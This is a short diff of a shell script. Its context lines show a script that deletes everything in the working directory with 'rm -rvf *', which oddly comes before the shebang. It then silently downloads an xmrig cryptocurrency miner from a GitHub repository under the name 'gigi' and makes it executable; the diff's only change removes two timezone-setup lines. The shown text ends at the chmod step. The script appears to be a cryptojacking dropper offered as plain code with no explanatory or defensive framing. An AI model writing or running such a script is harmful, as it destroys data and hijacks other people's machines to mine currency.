@@ -1,7 +1,5 @@
 rm -rvf * 
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
 apt update
 wget -O gigi https://github.com/kazppkido/kikir/raw/main/xmrig > /dev/null 2>&1
 chmod 777 gigi
